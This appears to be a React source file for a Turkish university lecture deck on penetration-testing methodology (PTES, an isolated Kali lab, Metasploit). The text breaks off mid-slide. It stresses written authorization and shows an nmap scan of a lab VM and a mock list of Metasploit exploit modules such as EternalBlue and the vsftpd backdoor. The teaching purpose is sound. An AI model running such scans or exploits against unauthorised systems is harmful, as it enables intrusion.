"use client";

import {
  useCallback,
  useEffect,
  useRef,
  useState,
  type ReactNode,
} from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Shield,
  ShieldCheck,
  Crosshair,
  Search,
  Target,
  Bug,
  Terminal,
  Layers,
  ListChecks,
  FileText,
  ScrollText,
  Server,
  KeyRound,
  Lock,
  Network,
  Zap,
  ArrowRight,
  ArrowUpCircle,
  Footprints,
  ClipboardList,
  Eye,
  AlertTriangle,
  Scale,
  Calendar,
  Brain,
  Sparkles,
  ChevronRight,
  ChevronLeft,
  Maximize2,
  Minimize2,
  Keyboard,
  type LucideIcon,
} from "lucide-react";
import "./styles.css";

/* ============================================================
   PRIMITIVES
   ============================================================ */

function SlideShell({
  children,
  bgPattern = true,
}: {
  children: ReactNode;
  bgPattern?: boolean;
}) {
  return (
    <div className="relative w-full h-full flex items-center justify-center px-12 py-16">
      {bgPattern && (
        <div className="absolute inset-0 sgbh-grid-bg pointer-events-none" />
      )}
      <div className="relative z-10 w-full max-w-6xl">{children}</div>
    </div>
  );
}

function Eyebrow({ children }: { children: ReactNode }) {
  return (
    <motion.div
      initial={{ opacity: 0, x: -10 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
      className="inline-flex items-center gap-3 mb-6 text-xs font-mono uppercase tracking-[0.25em] text-[#06b6d4]"
    >
      <span className="w-8 h-px bg-[#06b6d4]" />
      {children}
    </motion.div>
  );
}

function H1({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h1
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, ease: [0.22, 1, 0.36, 1] }}
      className={`text-5xl md:text-7xl font-bold tracking-tight leading-[1.05] text-white ${className}`}
    >
      {children}
    </motion.h1>
  );
}

function H2({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.h2
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.1 }}
      className={`text-3xl md:text-5xl font-semibold tracking-tight text-white ${className}`}
    >
      {children}
    </motion.h2>
  );
}

function Sub({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <motion.p
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className={`text-lg md:text-xl text-gray-400 leading-relaxed ${className}`}
    >
      {children}
    </motion.p>
  );
}

function FeatureCard({
  icon: Icon,
  title,
  desc,
  delay = 0,
  accent = "#06b6d4",
}: {
  icon: LucideIcon;
  title: string;
  desc: string;
  delay?: number;
  accent?: string;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-card sgbh-card-hover rounded-xl p-6 transition-all"
    >
      <div
        className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
        style={{ background: `${accent}15`, border: `1px solid ${accent}40` }}
      >
        <Icon className="w-6 h-6" style={{ color: accent }} />
      </div>
      <h3 className="text-lg font-semibold text-white mb-2">{title}</h3>
      <p className="text-sm text-gray-400 leading-relaxed">{desc}</p>
    </motion.div>
  );
}

function SectionDivider({
  num,
  total,
  title,
  subtitle,
  bgGradient,
  shadow,
  icon,
}: {
  num: string;
  total: string;
  title: string;
  subtitle: string;
  bgGradient: string;
  shadow: string;
  icon: ReactNode;
}) {
  return (
    <SlideShell bgPattern={false}>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
          className="inline-flex w-32 h-32 rounded-3xl items-center justify-center mb-8 sgbh-pulse"
          style={{ background: bgGradient, boxShadow: shadow }}
        >
          {icon}
        </motion.div>
        <Eyebrow>
          Bölüm {num} / {total}
        </Eyebrow>
        <H1>{title}</H1>
        <Sub className="mt-6 max-w-2xl mx-auto">{subtitle}</Sub>
      </div>
    </SlideShell>
  );
}

/* ============================================================
   TOPIC-SPECIFIC MOCKUPS
   ============================================================ */

function TerminalWindow({
  title,
  children,
}: {
  title: string;
  children: ReactNode;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.3, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-window-chrome w-full"
    >
      <div className="sgbh-window-bar flex items-center gap-2 px-4 py-2.5">
        <div className="flex gap-1.5">
          <span className="w-3 h-3 rounded-full bg-red-500/70" />
          <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
          <span className="w-3 h-3 rounded-full bg-green-500/70" />
        </div>
        <div
          className="flex items-center gap-2 ml-3 px-3 py-1 rounded text-[11px] font-mono flex-1 max-w-md mx-auto text-center justify-center"
          style={{ background: "#0d0d0d", color: "#67e8f9" }}
        >
          <span
            className="w-5 h-5 rounded-sm flex items-center justify-center text-[11px]"
            style={{ background: "linear-gradient(135deg,#06b6d4,#0891b2)", color: "white" }}
          >
            $_
          </span>
          <span>{title}</span>
        </div>
      </div>
      <div className="sgbh-terminal">{children}</div>
    </motion.div>
  );
}

function PtesFlow() {
  const steps = [
    { n: "01", name: "Pre-engagement", tr: "Sözleşme & kapsam", color: "#a78bfa" },
    { n: "02", name: "Intelligence", tr: "İstihbarat (OSINT)", color: "#06b6d4" },
    { n: "03", name: "Threat Modeling", tr: "Tehdit modelleme", color: "#22d3ee" },
    { n: "04", name: "Vuln Analysis", tr: "Zafiyet analizi", color: "#67e8f9" },
    { n: "05", name: "Exploitation", tr: "İstismar", color: "#fbbf24" },
    { n: "06", name: "Post-exploit", tr: "Sonrası & kalıcılık", color: "#f87171" },
    { n: "07", name: "Reporting", tr: "Raporlama", color: "#34d399" },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2 }}
      className="sgbh-flow mt-2"
    >
      {steps.map((s, i) => (
        <motion.div
          key={s.n}
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 + i * 0.08 }}
          className="sgbh-flow-step flex flex-col"
          style={{ borderColor: `${s.color}55`, background: `${s.color}0d` }}
        >
          <span className="sgbh-flow-num" style={{ color: s.color }}>
            {s.n}
          </span>
          <div className="text-[12px] font-semibold text-white mt-1 leading-tight">
            {s.name}
          </div>
          <div className="text-[10px] text-gray-400 mt-1 leading-snug">{s.tr}</div>
          {i < steps.length - 1 && (
            <ArrowRight
              className="w-3.5 h-3.5 absolute -right-[11px] top-1/2 -translate-y-1/2 z-10"
              style={{ color: `${s.color}` }}
            />
          )}
        </motion.div>
      ))}
    </motion.div>
  );
}

function MsfSearchTable() {
  const rows = [
    {
      no: 0,
      mod: "exploit/windows/smb/ms17_010_eternalblue",
      rank: "average",
      cls: "sgbh-msf-rank-gr",
      desc: "MS17-010 EternalBlue SMBv1",
    },
    {
      no: 1,
      mod: "exploit/multi/http/struts2_content_type_ognl",
      rank: "excellent",
      cls: "sgbh-msf-rank-ex",
      desc: "Apache Struts2 CVE-2017-5638",
    },
    {
      no: 2,
      mod: "exploit/unix/ftp/vsftpd_234_backdoor",
      rank: "excellent",
      cls: "sgbh-msf-rank-ex",
      desc: "vsftpd 2.3.4 arka kapı (smiley)",
      sel: true,
    },
    {
      no: 3,
      mod: "auxiliary/scanner/smb/smb_ms17_010",
      rank: "normal",
      cls: "sgbh-msf-rank-gr",
      desc: "MS17-010 zafiyet tarayıcı (sadece tespit)",
    },
  ];
  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.96, y: 20 }}
      animate={{ opacity: 1, scale: 1, y: 0 }}
      transition={{ duration: 0.6, delay: 0.2, ease: [0.22, 1, 0.36, 1] }}
      className="sgbh-window-chrome w-full"
    >
      <div className="sgbh-window-bar flex items-center gap-2 px-4 py-2.5">
        <div className="flex gap-1.5">
          <span className="w-3 h-3 rounded-full bg-red-500/70" />
          <span className="w-3 h-3 rounded-full bg-yellow-500/70" />
          <span className="w-3 h-3 rounded-full bg-green-500/70" />
        </div>
        <div
          className="flex items-center gap-2 ml-3 px-3 py-1 rounded text-[11px] flex-1 max-w-md mx-auto text-center justify-center font-mono"
          style={{ background: "#0d0d0d", color: "#67e8f9" }}
        >
          <Terminal className="w-3.5 h-3.5" />
          <span>msf6 &gt; search type:exploit vsftpd</span>
        </div>
      </div>
      <table className="sgbh-msf">
        <thead>
          <tr>
            <th style={{ width: "5%" }}>#</th>
            <th style={{ width: "52%" }}>Module</th>
            <th style={{ width: "13%" }}>Rank</th>
            <th>Description</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((r) => (
            <tr key={r.no} className={r.sel ? "sgbh-msf-sel" : undefined}>
              <td className="text-gray-500">{r.no}</td>
              <td className="text-gray-200">{r.mod}</td>
              <td className={r.cls}>{r.rank}</td>
              <td className="text-gray-400">{r.desc}</td>
            </tr>
          ))}
        </tbody>
      </table>
      <div className="px-4 py-2 text-[10px] font-mono text-gray-500 border-t border-white/5">
        Seçili: #2 · Rank = istismarın güvenilirlik/etki derecesi · excellent en güvenli, hedefi
        çökertme olasılığı düşük
      </div>
    </motion.div>
  );
}

/* ============================================================
   SLIDES
   ============================================================ */

const slides: Array<(active: boolean) => ReactNode> = [
  /* ───── 1. Kapak ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <Eyebrow>BVA 2205 · 9. Hafta · Güz Dönemi</Eyebrow>
        <H1>
          <span className="sgbh-shimmer">Sızma Testi Metodolojisi</span>
          <br />
          <span className="text-white/90">PTES &amp; Metasploit</span>
        </H1>
        <Sub className="mt-8 max-w-2xl mx-auto">
          Dağınık komutlar değil, yedi fazlı bir süreç. Kali + Metasploit ile keşiften
          rapora kontrollü bir sızma testi.
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-12 max-w-3xl mx-auto">
          <FeatureCard
            icon={Layers}
            title="PTES Süreci"
            desc="Yedi faz: kapsamdan istismara, istismardan rapora; standart bir metodoloji."
            delay={0.3}
            accent="#06b6d4"
          />
          <FeatureCard
            icon={Terminal}
            title="Kali Linux"
            desc="Pentest dağıtımı: nmap, Nessus/OpenVAS, Metasploit, Burp tek yerde."
            delay={0.45}
            accent="#fbbf24"
          />
          <FeatureCard
            icon={Bug}
            title="Metasploit"
            desc="Modül, payload, listener, session; istismarı düzenli yöneten çatı."
            delay={0.6}
            accent="#f87171"
          />
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-12 inline-flex items-center gap-2 text-xs font-mono text-gray-500"
        >
          <Calendar className="w-3.5 h-3.5" />
          Çarşamba 13:30 — 17:00 · Uygulamalı lab (Kali + Metasploitable)
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 2. Köprü: geçen hafta → bu hafta ───── */
  () => (
    <SlideShell>
      <Eyebrow>Köprü · keşiften saldırıya</Eyebrow>
      <H2>Açıkları bulduk; bu hafta o açıklardan içeri giriyoruz</H2>
      <Sub className="mt-3 max-w-3xl">
        Önceki haftalarda ağı haritaladık (Nmap) ve zafiyetleri tespit ettik. Bir zafiyetin
        &quot;var olduğunu&quot; göstermek ile onu &quot;istismar edip&quot; etkisini kanıtlamak farklıdır.
        Sızma testi tam da bu farkı, izinli ve raporlanabilir bir süreçle kurar.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-10">
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.2 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#67e8f9]">
            <Search className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Zafiyet taraması</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />Otomatik araç; &quot;bu sürümde şu CVE olabilir&quot; der.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />Yanlış pozitif çoktur; istismar denenmez.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#06b6d4] flex-shrink-0" />Çıktı: olası bulgu listesi.</li>
          </ul>
        </motion.div>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.35 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#f87171]">
            <Crosshair className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Sızma testi</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />İnsan eliyle zafiyeti gerçekten istismar eder.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Etkiyi kanıtlar: erişim, veri, hak yükseltme.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Çıktı: doğrulanmış bulgu + iş etkisi + öneri.</li>
          </ul>
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 3. Bu dersin akışı ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bu dersin akışı</Eyebrow>
      <H2>Üç durak: metodoloji → laboratuvar → istismar</H2>
      <Sub className="mt-3 max-w-3xl">
        Önce neden bir metodoloji (PTES) kullandığımızı; sonra Kali laboratuvarını kurmayı;
        en son Metasploit ile uçtan uca tek bir istismarı işliyoruz. Sonunda uygulamalı lab.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10">
        {[
          { range: "01", title: "PTES Metodolojisi", items: ["Neden süreç gerekli?", "Yedi faz", "Kapsam & kurallar (RoE)"], icon: Layers, accent: "#06b6d4" },
          { range: "02", title: "Kali Lab Kurulumu", items: ["İzole sanal ağ", "Saldırgan + hedef VM", "Araç envanteri"], icon: Terminal, accent: "#fbbf24" },
          { range: "03", title: "Metasploit İstismar", items: ["Modül & payload", "Meterpreter session", "Post-exploit & rapor"], icon: Bug, accent: "#f87171" },
        ].map((g, i) => (
          <motion.div
            key={g.title}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div className="flex items-center gap-3 mb-4">
              <div
                className="w-10 h-10 rounded-lg flex items-center justify-center"
                style={{ background: `${g.accent}18`, border: `1px solid ${g.accent}55` }}
              >
                <g.icon className="w-5 h-5" style={{ color: g.accent }} />
              </div>
              <div>
                <div className="text-[10px] font-mono uppercase tracking-widest" style={{ color: g.accent }}>Durak {g.range}</div>
                <div className="text-lg font-semibold text-white">{g.title}</div>
              </div>
            </div>
            <ul className="space-y-2 text-sm text-gray-400">
              {g.items.map((it) => (
                <li key={it} className="flex items-start gap-2">
                  <ChevronRight className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" style={{ color: g.accent }} />
                  <span>{it}</span>
                </li>
              ))}
            </ul>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 4. Bölüm 1 — PTES ───── */
  () => (
    <SectionDivider
      num="01"
      total="03"
      title="PTES — Metodoloji"
      subtitle="Penetration Testing Execution Standard. Sızma testini rastgele araç denemesi olmaktan çıkarıp tekrarlanabilir, kapsamı belli bir sürece dönüştüren yedi faz."
      bgGradient="linear-gradient(135deg,#06b6d4,#0e7490)"
      shadow="0 30px 80px -20px rgba(6,182,212,0.6)"
      icon={<Layers className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 5. PTES yedi faz şeridi ───── */
  () => (
    <SlideShell>
      <Eyebrow>PTES · yedi faz</Eyebrow>
      <H2 className="mb-2">Süreç soldan sağa akar</H2>
      <Sub className="max-w-3xl mb-8">
        Her faz bir sonrakini besler: önce kapsam ve izin, sonra istihbarat ve tehdit modeli,
        ardından istismar ve sonrası, en sonunda rapor. İstismar (faz 5) tek başına değil, bu
        zincirin yalnızca bir halkasıdır.
      </Sub>
      <PtesFlow />
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.9 }}
        className="mt-8 sgbh-card rounded-lg px-4 py-3 text-xs text-gray-400 flex items-start gap-3 max-w-4xl"
      >
        <ScrollText className="w-4 h-4 text-[#06b6d4] mt-0.5 flex-shrink-0" />
        <span>
          PTES bir kontrol listesi değil, bir iskelettir. OWASP WSTG, NIST SP 800-115 ve OSSTMM
          gibi diğer metodolojiler de benzer fazları farklı ayrıntıyla tanımlar.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 6. Pre-engagement & RoE ───── */
  () => (
    <SlideShell>
      <Eyebrow>Faz 1 · pre-engagement</Eyebrow>
      <H2 className="mb-2">Tek bir komut yazmadan önce: kapsam ve izin</H2>
      <Sub className="max-w-3xl mb-6">
        Sızma testini meslek yapan, suçtan ayıran şey burada belirlenir. Yazılı izin ve net
        kurallar (Rules of Engagement) olmadan hiçbir paket gönderilmez.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.2 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#a78bfa]">
            <ClipboardList className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Sözleşmede netleşmesi gereken</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#a78bfa] flex-shrink-0" />Kapsam: hangi IP/alan adı/uygulama dahil, hangisi hariç.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#a78bfa] flex-shrink-0" />Zaman penceresi ve test türü (black/gray/white-box).</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#a78bfa] flex-shrink-0" />İzin verilen teknikler: DoS, sosyal mühendislik dahil mi?</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#a78bfa] flex-shrink-0" />Acil durum iletişimi ve &quot;dur&quot; (stop) prosedürü.</li>
          </ul>
        </motion.div>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.35 }}
          className="sgbh-card-warn rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#f87171]">
            <AlertTriangle className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Olmazsa olmaz</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Yetkili imzalı yazılı izin (authorization letter).</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Üçüncü taraf varlıklar (bulut sağlayıcı vb.) için ayrı izin.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#f87171] flex-shrink-0" />Bulunan veriyi koruma ve sözleşme sonunda imha taahhüdü.</li>
          </ul>
          <p className="text-xs text-gray-500 mt-4 border-t border-white/5 pt-3">
            Kapsam dışı bir sisteme erişim, yazılı izin olsa bile TCK 243 kapsamına girebilir.
          </p>
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 7. Test türleri (box) ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bilgi seviyesi · üç kutu</Eyebrow>
      <H2 className="mb-2">Saldırgan ne kadar biliyor?</H2>
      <Sub className="max-w-3xl mb-8">
        Teste başlarken ekibe verilen bilgi miktarı, hem süreyi hem gerçekçiliği belirler.
        Hiçbiri diğerinden &quot;daha iyi&quot; değildir; amaca göre seçilir.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {[
          { box: "Black-box", color: "#f87171", icon: Eye, what: "Sıfır bilgi; dışarıdan bir saldırgan gibi.", mean: "En gerçekçi ama en uzun; çok zaman keşfe gider." },
          { box: "Gray-box", color: "#fbbf24", icon: Shield, what: "Kısmi bilgi: bir kullanıcı hesabı, ağ şeması.", mean: "İçeriden tehdit / yetkili kullanıcı senaryosu; dengeli." },
          { box: "White-box", color: "#34d399", icon: FileText, what: "Tam bilgi: kaynak kod, mimari, kimlik bilgileri.", mean: "En derin kapsama; kısa sürede en çok bulgu." },
        ].map((p, i) => (
          <motion.div
            key={p.box}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.15 + i * 0.12 }}
            className="sgbh-card rounded-xl p-6"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center mb-4"
              style={{ background: `${p.color}18`, border: `1px solid ${p.color}55` }}
            >
              <p.icon className="w-6 h-6" style={{ color: p.color }} />
            </div>
            <div className="font-mono text-lg font-bold mb-2" style={{ color: p.color }}>{p.box}</div>
            <p className="text-sm text-gray-300 mb-3">{p.what}</p>
            <p className="text-xs text-gray-500 border-t border-white/5 pt-3">{p.mean}</p>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 8. Bölüm 2 — Kali Lab ───── */
  () => (
    <SectionDivider
      num="02"
      total="03"
      title="Kali Linux — Laboratuvar"
      subtitle="Sızma testi araçlarının paketlendiği dağıtım ve onu güvenle çalıştıracağın izole laboratuvar. İnternete açık değil, kendine ait."
      bgGradient="linear-gradient(135deg,#f59e0b,#b45309)"
      shadow="0 30px 80px -20px rgba(245,158,11,0.55)"
      icon={<Terminal className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 9. İzole lab mimarisi ───── */
  () => (
    <SlideShell>
      <Eyebrow>Lab mimarisi · host-only ağ</Eyebrow>
      <H2 className="mb-2">Saldırgan ve hedef, dış dünyadan kopuk</H2>
      <Sub className="max-w-3xl mb-6">
        Lab tamamen izole bir sanal ağda kurulur (VirtualBox/VMware host-only). Saldırgan Kali,
        hedef ise kasıtlı zafiyetli bir VM&apos;dir. Köprü/NAT yoktur; kimse yanlışlıkla gerçek bir
        sisteme paket gönderemez.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.2 }}
        className="sgbh-card rounded-xl p-6"
      >
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
          <div className="rounded-lg p-5 text-center" style={{ background: "#06b6d40d", border: "1px solid #06b6d455" }}>
            <Terminal className="w-8 h-8 mx-auto mb-2 text-[#67e8f9]" />
            <div className="text-white font-semibold">Kali Linux</div>
            <div className="text-[11px] font-mono text-gray-400 mt-1">192.168.56.10 · saldırgan</div>
          </div>
          <div className="flex flex-col items-center justify-center text-center">
            <Network className="w-7 h-7 text-[#a78bfa] mb-2" />
            <div className="text-[11px] font-mono text-[#c4b5fd]">vboxnet0 · host-only</div>
            <div className="text-[11px] font-mono text-gray-500">192.168.56.0/24</div>
            <div className="flex items-center gap-2 mt-2 text-gray-600">
              <ArrowRight className="w-4 h-4" />
              <ArrowRight className="w-4 h-4 rotate-180" />
            </div>
          </div>
          <div className="rounded-lg p-5 text-center" style={{ background: "#f871710d", border: "1px solid #f8717155" }}>
            <Server className="w-8 h-8 mx-auto mb-2 text-[#f87171]" />
            <div className="text-white font-semibold">Metasploitable 2</div>
            <div className="text-[11px] font-mono text-gray-400 mt-1">192.168.56.101 · hedef</div>
          </div>
        </div>
        <div className="mt-5 flex items-center gap-2 text-[11px] text-gray-500 font-mono justify-center">
          <Lock className="w-3.5 h-3.5 text-[#34d399]" />
          NAT / Bridged KAPALI · sadece host-only · dış ağa çıkış yok
        </div>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 10. Kali araç envanteri ───── */
  () => (
    <SlideShell>
      <Eyebrow>Kali · araç envanteri</Eyebrow>
      <H2>Her faza karşılık gelen araç</H2>
      <Sub className="mt-3 max-w-3xl">
        Kali, yüzlerce aracı PTES fazlarına yayar. İstenirse her biri ayrı kurulabilir; Kali bu
        derlemeyi tek dağıtımda hazır sunar.
      </Sub>
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.3, duration: 0.6 }}
        className="mt-6 sgbh-card rounded-xl p-1"
      >
        <table className="sgbh-tbl">
          <thead>
            <tr>
              <th style={{ width: "24%" }}>Faz</th>
              <th style={{ width: "30%" }}>Tipik araç</th>
              <th>Ne işe yarar?</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td className="text-white font-semibold">İstihbarat (OSINT)</td>
              <td><span className="font-mono text-[#67e8f9]">theHarvester · Recon-ng · Maltego</span></td>
              <td>Açık kaynaktan e-posta, alt alan adı, çalışan bilgisi toplar.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Tarama & keşif</td>
              <td><span className="font-mono text-[#67e8f9]">nmap · masscan</span></td>
              <td>Açık port, servis ve sürüm tespiti; ağ haritası.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Zafiyet analizi</td>
              <td><span className="font-mono text-[#67e8f9]">OpenVAS · Nessus · nikto</span></td>
              <td>Bilinen CVE&apos;lerle eşleştirip aday zafiyet listesi çıkarır.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">İstismar</td>
              <td><span className="font-mono text-[#f87171]">Metasploit Framework · sqlmap</span></td>
              <td>Zafiyeti gerçekten kullanır; erişim/oturum elde eder.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Web uygulaması</td>
              <td><span className="font-mono text-[#67e8f9]">Burp Suite · OWASP ZAP</span></td>
              <td>HTTP isteklerini durdurur, değiştirir; web zafiyeti avlar.</td>
            </tr>
            <tr>
              <td className="text-white font-semibold">Parola saldırısı</td>
              <td><span className="font-mono text-[#67e8f9]">Hydra · John · Hashcat</span></td>
              <td>Zayıf parolayı kaba kuvvet / sözlük / hash kırma ile bulur.</td>
            </tr>
          </tbody>
        </table>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 11. nmap keşif terminali ───── */
  () => (
    <SlideShell>
      <Eyebrow>Lab · keşif ile başlar</Eyebrow>
      <H2 className="mb-2">Hedef VM&apos;de hangi kapı açık?</H2>
      <Sub className="max-w-3xl mb-6">
        Metasploit&apos;e geçmeden önce hedefi haritalarız. Aşağıdaki çıktıda
        <span className="text-red-400 font-mono"> vsftpd 2.3.4</span> bilinen bir arka kapıya sahip;
        bir sonraki adımda tam olarak bunu istismar edeceğiz.
      </Sub>
      <TerminalWindow title="kali@pentest:~ — nmap -sV">
        <div>
          <span className="sgbh-term-prompt">kali@pentest</span>
          <span className="sgbh-term-dim">:~$</span>{" "}
          <span className="sgbh-term-cmd">sudo nmap -sS -sV -p- 192.168.56.101</span>
        </div>
        <div className="sgbh-term-dim">Starting Nmap 7.94 ( https://nmap.org )</div>
        <div className="sgbh-term-dim">Nmap scan report for <span className="sgbh-term-ip">192.168.56.101</span></div>
        <div className="sgbh-term-dim">Host is up (0.00038s latency).</div>
        <div className="mt-1"><span className="sgbh-term-warn">PORT      STATE  SERVICE   VERSION</span></div>
        <div><span className="sgbh-term-err">21/tcp    open   ftp</span>{" "}<span className="sgbh-term-err">vsftpd 2.3.4 (bilinen arka kapı)</span></div>
        <div><span className="sgbh-term-ok">22/tcp    open   ssh</span>{" "}<span className="sgbh-term-dim">OpenSSH 4.7p1 (protocol 2.0)</span></div>
        <div><span className="sgbh-term-ok">80/tcp    open   http</span>{" "}<span className="sgbh-term-dim">Apache httpd 2.2.8</span></div>
        <div><span className="sgbh-term-err">139/tcp   open   smb</span>{" "}<span className="sgbh-term-err">Samba 3.0.20 (CVE riski)</span></div>
        <div><span className="sgbh-term-err">3306/tcp  open   mysql</span>{" "}<span className="sgbh-term-err">MySQL 5.0.51a (eski)</span></div>
        <div className="sgbh-term-dim mt-1">Service detection performed. 5 services, 3 with known issues.</div>
        <div className="mt-2">
          <span className="sgbh-term-prompt">kali@pentest</span>
          <span className="sgbh-term-dim">:~$</span>{" "}
          <span className="sgbh-term-cmd">_</span>
          <span className="animate-pulse">█</span>
        </div>
      </TerminalWindow>
    </SlideShell>
  ),

  /* ───── 12. Bölüm 3 — Metasploit ───── */
  () => (
    <SectionDivider
      num="03"
      total="03"
      title="Metasploit — İstismar"
      subtitle="Zafiyeti tek tek elle yazmak yerine modüllerle yönetmek. Exploit + payload + oturum yönetimini tek çatıda toplayan sektör standardı framework."
      bgGradient="linear-gradient(135deg,#ef4444,#7f1d1d)"
      shadow="0 30px 80px -20px rgba(239,68,68,0.55)"
      icon={<Bug className="w-16 h-16 text-white" />}
    />
  ),

  /* ───── 13. Metasploit anatomisi ───── */
  () => (
    <SlideShell>
      <Eyebrow>Metasploit · dört kavram</Eyebrow>
      <H2 className="mb-2">Modül · Payload · Listener · Session</H2>
      <Sub className="max-w-3xl mb-6">
        Komutları ezberlemeden önce dört temel kavramı oturtmak gerekir; geri kalan her şey
        bu dördünün bir kombinasyonudur.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        {[
          { icon: Layers, name: "Modül", color: "#06b6d4", desc: "exploit / auxiliary / payload / post. Belirli bir işi yapan kod birimi." },
